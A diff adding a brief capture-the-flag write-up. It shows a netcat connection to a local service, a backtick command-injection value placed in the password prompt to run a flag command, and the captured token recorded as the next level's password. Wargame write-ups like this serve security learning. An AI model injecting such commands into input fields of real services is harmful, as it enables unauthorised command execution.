@@ -1,0 +1,9 @@
+$>netcat 127.0.0.1 5151
+
+Password: `getflag > /tmp/toto`
+
+$>cat /tmp/toto
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+password lvl12 : fa6v5ateaw21peobuub8ipe6s
